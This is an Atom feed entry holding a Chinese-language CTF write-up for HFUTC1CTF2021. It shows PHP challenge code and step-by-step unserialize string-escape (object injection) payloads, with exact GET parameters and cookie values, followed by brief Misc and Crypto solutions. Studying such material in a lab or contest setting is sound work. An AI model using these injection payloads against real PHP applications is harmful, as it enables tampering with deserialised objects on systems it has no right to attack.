<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://dpm12345.cn</id>
    <title>dpm12345 • Posts by &#34;笔记&#34; tag</title>
    <link href="http://dpm12345.cn" />
    <updated>2022-07-23T12:10:32.000Z</updated>
    <category term="Qt" />
    <category term="ms17" />
    <category term="msf" />
    <category term="git" />
    <category term="CTF" />
    <category term="sql注入" />
    <category term="笔记" />
    <category term="SSRF" />
    <category term="kali" />
    <category term="nmap" />
    <category term="Misc" />
    <category term="MFC" />
    <category term="cryptography" />
    <category term="ctfshow" />
    <category term="Web" />
    <category term="树" />
    <category term="二叉树" />
    <category term="数据结构" />
    <category term="hexo" />
    <category term="队列" />
    <category term="前缀和" />
    <category term="动态规划" />
    <category term="滑动窗口" />
    <category term="数组" />
    <category term="哈希表" />
    <category term="链表" />
    <category term="矩阵" />
    <category term="递归" />
    <category term="贪心" />
    <category term="子序列" />
    <category term="最长公共子序列" />
    <category term="最长回文子序列" />
    <category term="字符串" />
    <category term="括号" />
    <category term="vector" />
    <category term="栈" />
    <category term="双指针（快慢指针）" />
    <category term="排列组合" />
    <category term="等差数列" />
    <category term="深度优先搜索" />
    <category term="广度优先搜索" />
    <category term="ciscn" />
    <category term="SSTI" />
    <category term="arm-linux" />
    <category term="Tiny6410" />
    <category term="信息安全" />
    <category term="linux" />
    <category term="web" />
    <category term="javascript" />
    <category term="XXE" />
    <entry>
        <id>http://dpm12345.cn/posts/d762243c/</id>
        <title>HFUTC1CTF2021</title>
        <link rel="alternate" href="http://dpm12345.cn/posts/d762243c/"/>
        <content type="html">&lt;h1 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&#34;warmup&#34;&gt;&lt;a href=&#34;#warmup&#34; class=&#34;headerlink&#34; title=&#34;warmup&#34;&gt;&lt;/a&gt;warmup&lt;/h2&gt;&lt;h2 id=&#34;version&#34;&gt;&lt;a href=&#34;#version&#34; class=&#34;headerlink&#34; title=&#34;version&#34;&gt;&lt;/a&gt;version&lt;/h2&gt;&lt;h2 id=&#34;baby-escape&#34;&gt;&lt;a href=&#34;#baby-escape&#34; class=&#34;headerlink&#34; title=&#34;baby escape&#34;&gt;&lt;/a&gt;baby escape&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#34;flag.php&#34;);
class Foo
{
    public $key;
    public $test = &#39;nonono&#39;;
    public function __construct($k)
    {
        $this-&amp;gt;key = $k;
    }
}
$k = $_GET[&#39;k&#39;];
if (isset($k)) {
    $foo = new Foo($k);
    $msg = str_replace(&#39;HFUT&#39;, &#39;C1CTF_IS_FUN&#39;, serialize($foo));
    $foo_ultimate = unserialize($msg);
    if ($foo_ultimate-&amp;gt;test === &#39;C1CTF_IS_FUN&#39;) {
        echo ($flag);
    } else {
        echo (&#34;what are you doing??&#34;);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;很明显为反序列化字符串逃逸4–&amp;gt;12，增加了8个字符 将最后的代码放到网页文件跑一下就行&lt;/p&gt;
&lt;p&gt;由于&lt;code&gt;test&lt;/code&gt;在&lt;code&gt;key&lt;/code&gt;，那么必然要提前闭合，在之前就序列化&lt;code&gt;test&lt;/code&gt;的值 &lt;/p&gt;
&lt;p&gt;所以&lt;code&gt;key&lt;/code&gt;的后半部分必为&lt;code&gt;s:4:&#34;test&#34;;s:12:&#34;C1CTF_IS_FUN&#34;;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;先进行上述字符串的序列化，得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;O:3:&#34;Foo&#34;:2:{s:3:&#34;key&#34;;s:32:&#34;s:4:&#34;test&#34;;s:12:&#34;C1CTF_IS_FUN&#34;;}&#34;;s:4:&#34;test&#34;;s:6:&#34;nonono&#34;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;计算&lt;code&gt;key&lt;/code&gt;的值的前引号后第一个(即&lt;code&gt;s&lt;/code&gt;) 到第一个&lt;code&gt;}&lt;/code&gt;的长度，为32 ，恰好为4个8，但由于需要闭合前一个引号，故总共为34个字符（闭合引号，分号)&lt;/p&gt;
&lt;p&gt;所以需要5个&lt;code&gt;HUFT&lt;/code&gt;，为了匹配，可在&lt;code&gt;}&lt;/code&gt;后加6个字符(因为已经提前结束，无影响)&lt;/p&gt;
&lt;p&gt;故 payload 为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;k=HFUTHFUTHFUTHFUTHFUT&#34;;s:4:&#34;test&#34;;s:12:&#34;C1CTF_IS_FUN&#34;;};;;;;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;easy-escape&#34;&gt;&lt;a href=&#34;#easy-escape&#34; class=&#34;headerlink&#34; title=&#34;easy escape&#34;&gt;&lt;/a&gt;easy escape&lt;/h2&gt;&lt;p&gt;最后构造的两个类为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$foo1 = new Foo4(&#34;C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&#34;, &#39;&#34;;s:1:&#34;a&#34;;s:0:&#34;&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;}&#39;);
$foo2 = new Foo4(&#34;C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&#34;, &#39;&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;s:5:&#34;space&#34;;s:0:&#34;&#34;;}&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;源代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#34;flag.php&#34;);
class Foo1
{
    public $space;
    public $a;
    public $test = &#39;nonono&#39;;
    public $b;
    public function __construct($a, $b)
    {
        $this-&amp;gt;a = $a;
        $this-&amp;gt;b = $b;
    }
}
class Foo2
{
    public $b;
    public $test = &#39;nonono&#39;;
    public $a;
    public $space;
    public function __construct($a, $b)
    {
        $this-&amp;gt;a = $a;
        $this-&amp;gt;b = $b;
    }
}
class Foo3
{
    public $a;
    public $b;
    public $space;
    public $test = &#39;nonono&#39;;
    public function __construct($a, $b)
    {
        $this-&amp;gt;a = $a;
        $this-&amp;gt;b = $b;
    }
}
class Foo4
{
    public $a;
    public $test = &#39;nonono&#39;;
    public $b;
    public $space;
    public function __construct($a, $b)
    {
        $this-&amp;gt;a = $a;
        $this-&amp;gt;b = $b;
    }
}
$a1 = $_GET[&#39;a1&#39;];
$b1 = $_GET[&#39;b1&#39;];
$a2 = $_GET[&#39;a2&#39;];
$b2 = $_GET[&#39;b2&#39;];
$choice1 = &#34;Foo1&#34;;
$choice2 = &#34;Foo1&#34;;
if (isset($_COOKIE[&#34;choice1&#34;]) &amp;amp;&amp;amp; isset($_COOKIE[&#34;choice2&#34;])) {
    $choice1 = $_COOKIE[&#34;choice1&#34;];
    $choice2 = $_COOKIE[&#34;choice2&#34;];
}
if (isset($a1) &amp;amp;&amp;amp; isset($b1) &amp;amp;&amp;amp; isset($a2) &amp;amp;&amp;amp; isset($b2)) {
    switch ($choice1) {
        case &#34;Foo1&#34;:
            $foo1 = new Foo1($a1, $b1);
            break;
        case &#34;Foo2&#34;:
            $foo1 = new Foo2($a1, $b1);
            break;
        case &#34;Foo3&#34;:
            $foo1 = new Foo3($a1, $b1);
            break;
        case &#34;Foo4&#34;:
            $foo1 = new Foo4($a1, $b1);
            break;
        default:
            $foo1 = new Foo1($a1, $b1);
    }
    switch ($choice2) {
        case &#34;Foo1&#34;:
            $foo2 = new Foo1($a2, $b2);
            break;
        case &#34;Foo2&#34;:
            $foo2 = new Foo2($a2, $b2);
            break;
        case &#34;Foo3&#34;:
            $foo2 = new Foo3($a2, $b2);
            break;
        case &#34;Foo4&#34;:
            $foo2 = new Foo4($a2, $b2);
            break;
        default:
            $foo2 = new Foo1($a2, $b2);
    }
    $msg1 = str_replace(&#39;C1CTF_IS_FUN&#39;, &#39;HFUT&#39;, serialize($foo1));
    $msg2 = str_replace(&#39;C1CTF_IS_FUN&#39;, &#39;HFUT&#39;, serialize($foo2));
    $foo_ultimate1 = unserialize($msg1);
    $foo_ultimate2 = unserialize($msg2);
    if ($foo_ultimate1-&amp;gt;test === &#39;HFUT&#39; &amp;amp;&amp;amp; $foo_ultimate1-&amp;gt;a === &#39;&#39; &amp;amp;&amp;amp; $foo_ultimate1-&amp;gt;b === &#39;&#39;) {
        if ($foo_ultimate2-&amp;gt;test === &#39;HFUT&#39; &amp;amp;&amp;amp; $foo_ultimate2-&amp;gt;b === &#39;&#39; &amp;amp;&amp;amp; $foo_ultimate2-&amp;gt;space === &#39;&#39;) {
            echo ($flag);
        } else {
            echo (&#34;what are you fuxking doing??&#34;);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码分析得最重要部分为后半部分的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$msg1 = str_replace(&#39;C1CTF_IS_FUN&#39;, &#39;HFUT&#39;, serialize($foo1));
$msg2 = str_replace(&#39;C1CTF_IS_FUN&#39;, &#39;HFUT&#39;, serialize($foo2));
$foo_ultimate1 = unserialize($msg1);
$foo_ultimate2 = unserialize($msg2);
if ($foo_ultimate1-&amp;gt;test === &#39;HFUT&#39; &amp;amp;&amp;amp; $foo_ultimate1-&amp;gt;a === &#39;&#39; &amp;amp;&amp;amp; $foo_ultimate1-&amp;gt;b === &#39;&#39;) {
    if ($foo_ultimate2-&amp;gt;test === &#39;HFUT&#39; &amp;amp;&amp;amp; $foo_ultimate2-&amp;gt;b === &#39;&#39; &amp;amp;&amp;amp; $foo_ultimate2-&amp;gt;space === &#39;&#39;) {
        echo ($flag);
    } else {
        echo (&#34;what are you fuxking doing??&#34;);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看到字符串过滤，很容易想到字符串逃逸，&lt;/p&gt;
&lt;h3 id=&#34;对第一个-if-判断&#34;&gt;&lt;a href=&#34;#对第一个-if-判断&#34; class=&#34;headerlink&#34; title=&#34;对第一个 if 判断&#34;&gt;&lt;/a&gt;对第一个 if 判断&lt;/h3&gt;&lt;p&gt;这里的主要思想为：当&lt;code&gt;$a&lt;/code&gt;的字符串比较长时，通过过滤，字符串缩短，使得后面的&lt;code&gt;$b&lt;/code&gt;的一部分值包含在变量a的序列化中，即如&lt;code&gt;s:1:&#34;b&#34;;s:59:&#34;&lt;/code&gt;包含在其中，使得b的序列化并未开始，由于此时冒号后面可自动添加序列化字符串，那么可在原b变量上加上需要满足条件的序列化字符串，即&lt;code&gt;s:1:&#34;a&#34;;s:0:&#34;&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;&lt;/code&gt;,为了能够使其序列化成功，可在最后加上&lt;code&gt;}&lt;/code&gt;，使其提前结束。&lt;/p&gt;
&lt;p&gt;那么接下来的主力工作是要让a的序列化字符串长度在过滤后恰能到达b的字符串值的前引号的位置，由于对space无要求，在以上分析中，只需a在b前即可，即可选用Foo1，Foo3，Foo4三个类，这里采用Foo4&lt;/p&gt;
&lt;p&gt;首先输入空值进行序列化操作，得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;O:4:&#34;Foo4&#34;:4:{s:1:&#34;a&#34;;s:0:&#34;&#34;;s:4:&#34;test&#34;;s:6:&#34;nonono&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;s:5:&#34;space&#34;;N;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;计算从a的值的后引号到b的值的前引号的长度，发现为39个，不是12-4=8的倍数，为了满足，可在b的值开头加上任意一个字符(这里使用双引号)，使到其位置恰为40个，为8的5倍，那么a的值应为5个 &lt;code&gt;C1CTF_IS_FUN&lt;/code&gt;，据此，前半部分payload为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;amp;b1=&#34;;s:1:&#34;a&#34;;s:0:&#34;&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;对第二个-if-判断&#34;&gt;&lt;a href=&#34;#对第二个-if-判断&#34; class=&#34;headerlink&#34; title=&#34;对第二个 if 判断&#34;&gt;&lt;/a&gt;对第二个 if 判断&lt;/h3&gt;&lt;p&gt;同理，通过 a的序列化字符串覆盖部分b的值&lt;/p&gt;
&lt;p&gt;那么根据第一个的分析a必须在b的前面，而在第二个判断中对space有要求，那么space必须在a的后面(此前试过在前面，无法正常序列化)。因此，可选择的类有Foo3、Foo4，由于对于Foo4来说，此时的判断只是增加了对space的赋值，只会对b2的赋值有影响，所以如果选用Foo4 ，a2的值仍为5个&lt;code&gt;C1CTF_IS_FUN&lt;/code&gt;，而对Foo3来说，中间少了test的序列化字符串，后引号到前引号的长度有所改变，要重新计算 &lt;code&gt;C1CTF_IS_FUN&lt;/code&gt;的个数并凑齐倍数，所以为了方便这里还是使用Foo4由于此时对a的值无要求，对space有要求，因此此时&lt;code&gt;b2=&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;s:5:&#34;space&#34;;s:0:&#34;&#34;;}&lt;/code&gt;故后半部分payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a2=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;amp;b2=&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;s:5:&#34;space&#34;;s:0:&#34;&#34;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;故最后的 payload&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GET&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;amp;b1=&#34;;s:1:&#34;a&#34;;s:0:&#34;&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;}&amp;amp;a2=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;amp;b2=&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;s:5:&#34;space&#34;;s:0:&#34;&#34;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;SESSION&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;choice1 = Foo4
choice2 = Foo4
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;同理，第二个使用-Foo3&#34;&gt;&lt;a href=&#34;#同理，第二个使用-Foo3&#34; class=&#34;headerlink&#34; title=&#34;同理，第二个使用 Foo3&#34;&gt;&lt;/a&gt;同理，第二个使用 Foo3&lt;/h3&gt;&lt;p&gt;先空字符序列化，得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;O:4:&#34;Foo3&#34;:4:{s:1:&#34;a&#34;;s:0:&#34;&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;s:5:&#34;space&#34;;N;s:4:&#34;test&#34;;s:6:&#34;nonono&#34;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只有15个字符，那么只需要2个&lt;code&gt;C1CTF_IS_FUN&lt;/code&gt;,b添加一个字符即可，故payload为&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GET&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;amp;b1=&#34;;s:1:&#34;a&#34;;s:0:&#34;&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;}&amp;amp;a2=C1CTF_IS_FUNC1CTF_IS_FUN&amp;amp;b2=&#34;;s:4:&#34;test&#34;;s:4:&#34;HFUT&#34;;s:1:&#34;b&#34;;s:0:&#34;&#34;;s:5:&#34;space&#34;;s:0:&#34;&#34;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;SESSION&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;choice1 = Foo4
choice2 = Foo3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同理，对于第一个类的更换也是如此进行&lt;/p&gt;
&lt;h2 id=&#34;baby-php&#34;&gt;&lt;a href=&#34;#baby-php&#34; class=&#34;headerlink&#34; title=&#34;baby php&#34;&gt;&lt;/a&gt;baby php&lt;/h2&gt;&lt;h2 id=&#34;baby-calculator&#34;&gt;&lt;a href=&#34;#baby-calculator&#34; class=&#34;headerlink&#34; title=&#34;baby calculator&#34;&gt;&lt;/a&gt;baby calculator&lt;/h2&gt;&lt;h2 id=&#34;real-calculator&#34;&gt;&lt;a href=&#34;#real-calculator&#34; class=&#34;headerlink&#34; title=&#34;real calculator&#34;&gt;&lt;/a&gt;real calculator&lt;/h2&gt;&lt;h1 id=&#34;Misc&#34;&gt;&lt;a href=&#34;#Misc&#34; class=&#34;headerlink&#34; title=&#34;Misc&#34;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&#34;bigjpg&#34;&gt;&lt;a href=&#34;#bigjpg&#34; class=&#34;headerlink&#34; title=&#34;bigjpg&#34;&gt;&lt;/a&gt;bigjpg&lt;/h2&gt;&lt;h2 id=&#34;音乐带师&#34;&gt;&lt;a href=&#34;#音乐带师&#34; class=&#34;headerlink&#34; title=&#34;音乐带师&#34;&gt;&lt;/a&gt;音乐带师&lt;/h2&gt;&lt;h2 id=&#34;osint&#34;&gt;&lt;a href=&#34;#osint&#34; class=&#34;headerlink&#34; title=&#34;osint&#34;&gt;&lt;/a&gt;osint&lt;/h2&gt;&lt;h2 id=&#34;幸运饼干&#34;&gt;&lt;a href=&#34;#幸运饼干&#34; class=&#34;headerlink&#34; title=&#34;幸运饼干&#34;&gt;&lt;/a&gt;幸运饼干&lt;/h2&gt;&lt;h2 id=&#34;signin&#34;&gt;&lt;a href=&#34;#signin&#34; class=&#34;headerlink&#34; title=&#34;signin&#34;&gt;&lt;/a&gt;signin&lt;/h2&gt;&lt;p&gt;AES解密&lt;/p&gt;
&lt;h2 id=&#34;qrcode&#34;&gt;&lt;a href=&#34;#qrcode&#34; class=&#34;headerlink&#34; title=&#34;qrcode&#34;&gt;&lt;/a&gt;qrcode&lt;/h2&gt;&lt;p&gt;下载得到的rar是损坏文件，用winhex将第一行第三个改为&lt;code&gt;72&lt;/code&gt;，保存解压， 得到一个图片和一个txt文件。打开图片发现图片一闪一闪。那么将该图片用ps打开， 到对应图层，发现二维码部分缺失，这时用仿制图章将左下角分别复制到左上和右上，扫描后得到flag&lt;/p&gt;
&lt;h1 id=&#34;Crypto&#34;&gt;&lt;a href=&#34;#Crypto&#34; class=&#34;headerlink&#34; title=&#34;Crypto&#34;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&#34;嘀嘀嘀&#34;&gt;&lt;a href=&#34;#嘀嘀嘀&#34; class=&#34;headerlink&#34; title=&#34;嘀嘀嘀&#34;&gt;&lt;/a&gt;嘀嘀嘀&lt;/h2&gt;&lt;p&gt;点开题目首先确认为摩斯密码，解码后得到一串字母，因题目提示栅栏，故栅栏解密， 当组字数为8时，注意到从右往左为”flagis…..”,由此写程序反转字符串，再将flag内容与flag格式结合得到flag&lt;/p&gt;
</content>
        <category term="CTF" />
        <category term="笔记" />
        <updated>2022-07-23T12:10:32.000Z</updated>
    </entry>
</feed>
